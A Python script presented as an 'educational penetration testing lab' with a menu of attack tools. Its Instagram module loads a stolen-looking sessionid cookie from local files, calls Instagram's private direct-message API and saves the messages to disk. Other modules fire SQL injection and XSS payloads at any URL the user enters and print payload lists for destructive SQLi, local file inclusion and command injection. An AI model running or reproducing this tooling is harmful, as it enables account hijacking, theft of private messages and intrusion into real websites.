#!/usr/bin/env python3
"""
🔥 ADVANCED PENETRATION TESTING LAB 2025 🔥
==========================================
🎯 Complete Hacking Environment + Tools
💀 Web Exploitation + Session Hijacking + CTF Techniques
⚡ Instagram DM Extraction + API Bypass + Forensics
🚨 Educational Penetration Testing Lab Only!
"""

import json
import requests
import base64
import re
import time
import random
import hashlib
import os
import sys
from datetime import datetime

class PenetrationTestingLab:
    def __init__(self):
        self.session = requests.Session()
        self.tools_loaded = []
        self.targets = []
        self.results = {}
        
    def banner(self):
        """Display hacker banner"""
        print("🔥" * 50)
        print("💀 ADVANCED PENETRATION TESTING LAB 2025 💀")
        print("🔥" * 50)
        print("🎯 Available Tools:")
        print("   [1] Instagram DM Extractor")
        print("   [2] Session Hijacker")
        print("   [3] Web Vulnerability Scanner")
        print("   [4] CTF Challenge Solver")
        print("   [5] API Endpoint Fuzzer")
        print("   [6] Data Forensics Analyzer")
        print("   [7] Payload Generator")
        print("   [8] Network Scanner")
        print("🔥" * 50)
    
    def instagram_dm_exploit(self):
        """Instagram DM extraction module"""
        print("\\n🎯 INSTAGRAM DM EXPLOITATION MODULE")
        print("=" * 40)
        
        # Session paths to scan
        session_paths = [
            "sensitive_data/session.json",
            "session.json",
            "fresh_sessions/working_session_1749202526.json",
            "alx_trading_session_fleming654.json"
        ]
        
        sessionid = None
        for path in session_paths:
            if os.path.exists(path):
                try:
                    with open(path) as f:
                        data = json.load(f)
                    if "sessionid" in data:
                        sessionid = re.sub(r'\\x1b\\[D', '', data["sessionid"]).strip()
                        if len(sessionid) > 20:
                            print(f"✅ Session loaded from: {path}")
                            break
                except:
                    continue
        
        if not sessionid:
            print("❌ No valid session found!")
            return False
        
        # Instagram API endpoints
        endpoints = [
            "https://i.instagram.com/api/v1/direct_v2/inbox/",
            "https://www.instagram.com/api/v1/direct_v2/inbox/",
            "https://graph.instagram.com/me/conversations"
        ]
        
        # Setup session
        self.session.headers.update({
            "User-Agent": "Instagram 246.0.0.20.107 Android",
            "X-IG-App-ID": "936619743392459",
            "Accept": "*/*"
        })
        
        self.session.cookies.set("sessionid", sessionid, domain=".instagram.com")
        
        # Try each endpoint
        for endpoint in endpoints:
            print(f"🔄 Testing: {endpoint}")
            try:
                response = self.session.get(endpoint, timeout=10)
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    self.save_results("instagram_dm", data)
                    print("✅ DM data extracted successfully!")
                    return True
                    
            except Exception as e:
                print(f"   Error: {e}")
        
        print("❌ All endpoints failed")
        return False
    
    def web_vulnerability_scanner(self):
        """Web vulnerability scanning module"""
        print("\\n🕷️ WEB VULNERABILITY SCANNER")
        print("=" * 40)
        
        target = input("Enter target URL (or 'demo'): ")
        if target.lower() == 'demo':
            target = "http://testphp.vulnweb.com"
        
        vulnerabilities = []
        
        # SQL Injection test
        sqli_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' AND (SELECT SLEEP(5))--"
        ]
        
        print("🔍 Testing SQL Injection...")
        for payload in sqli_payloads:
            test_url = f"{target}?id={payload}"
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                
                if elapsed > 4:  # Time-based detection
                    vulnerabilities.append(f"Time-based SQLi: {payload}")
                elif "error" in response.text.lower():
                    vulnerabilities.append(f"Error-based SQLi: {payload}")
                    
            except:
                pass
        
        # XSS test
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        print("🔍 Testing XSS...")
        for payload in xss_payloads:
            test_url = f"{target}?search={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if payload in response.text:
                    vulnerabilities.append(f"Reflected XSS: {payload}")
            except:
                pass
        
        self.results['web_scan'] = vulnerabilities
        print(f"✅ Scan complete. Found {len(vulnerabilities)} vulnerabilities")
        return vulnerabilities
    
    def ctf_challenge_solver(self):
        """CTF challenge solving module"""
        print("\\n🏁 CTF CHALLENGE SOLVER")
        print("=" * 40)
        
        challenge_type = input("Challenge type (crypto/web/forensics/pwn): ").lower()
        
        if challenge_type == "crypto":
            print("🔐 Crypto tools loaded...")
            
            # Base64 decoder
            data = input("Enter Base64 data: ")
            try:
                decoded = base64.b64decode(data).decode()
                print(f"Decoded: {decoded}")
            except:
                print("Invalid Base64")
            
            # ROT13
            text = input("Enter ROT13 text: ")
            rot13 = text.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
            ))
            print(f"ROT13: {rot13}")
            
        elif challenge_type == "web":
            print("🕷️ Web exploitation tools loaded...")
            self.web_vulnerability_scanner()
            
        elif challenge_type == "forensics":
            print("🔍 Forensics tools loaded...")
            filename = input("Enter file to analyze: ")
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    data = f.read()
                print(f"File size: {len(data)} bytes")
                print(f"MD5: {hashlib.md5(data).hexdigest()}")
                print(f"SHA256: {hashlib.sha256(data).hexdigest()}")
            
        return True
    
    def api_fuzzer(self):
        """API endpoint fuzzing module"""
        print("\\n⚡ API ENDPOINT FUZZER")
        print("=" * 40)
        
        base_url = input("Enter base API URL: ")
        if not base_url:
            base_url = "https://jsonplaceholder.typicode.com"
        
        # Common API endpoints
        endpoints = [
            "/users", "/posts", "/comments", "/albums", "/photos",
            "/api/v1/users", "/api/v2/users", "/admin", "/debug",
            "/config", "/status", "/health", "/version"
        ]
        
        found_endpoints = []
        
        for endpoint in endpoints:
            url = base_url + endpoint
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    found_endpoints.append(f"{endpoint} - {response.status_code}")
                    print(f"✅ {endpoint} - Status: {response.status_code}")
                elif response.status_code != 404:
                    print(f"⚠️ {endpoint} - Status: {response.status_code}")
            except:
                pass
        
        self.results['api_fuzz'] = found_endpoints
        return found_endpoints
    
    def payload_generator(self):
        """Payload generation module"""
        print("\\n💣 PAYLOAD GENERATOR")
        print("=" * 40)
        
        payload_type = input("Payload type (sqli/xss/lfi/rce): ").lower()
        
        payloads = {
            'sqli': [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,NULL,NULL --",
                "'; DROP TABLE users; --",
                "' AND (SELECT SLEEP(5)) --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php"
            ],
            'rce': [
                "; cat /etc/passwd",
                "| whoami",
                "`id`",
                "$(uname -a)"
            ]
        }
        
        if payload_type in payloads:
            print(f"\\n{payload_type.upper()} Payloads:")
            for i, payload in enumerate(payloads[payload_type], 1):
                print(f"  [{i}] {payload}")
        
        return payloads.get(payload_type, [])
    
    def save_results(self, module, data):
        """Save results to file"""
        timestamp = int(time.time())
        filename = f"pentest_results_{module}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"💾 Results saved: {filename}")
        return filename
    
    def main_menu(self):
        """Main interactive menu"""
        self.banner()
        
        while True:
            print("\\n🎯 Select tool:")
            choice = input("Enter choice (1-8) or 'q' to quit: ")
            
            if choice == '1':
                self.instagram_dm_exploit()
            elif choice == '2':
                print("🔐 Session Hijacker - Coming soon!")
            elif choice == '3':
                self.web_vulnerability_scanner()
            elif choice == '4':
                self.ctf_challenge_solver()
            elif choice == '5':
                self.api_fuzzer()
            elif choice == '6':
                print("🔍 Data Forensics - Coming soon!")
            elif choice == '7':
                self.payload_generator()
            elif choice == '8':
                print("🌐 Network Scanner - Coming soon!")
            elif choice.lower() == 'q':
                print("👋 Exiting penetration testing lab...")
                break
            else:
                print("❌ Invalid choice!")


def main():
    """Main function"""
    lab = PenetrationTestingLab()
    lab.main_menu()


if __name__ == "__main__":
    main()
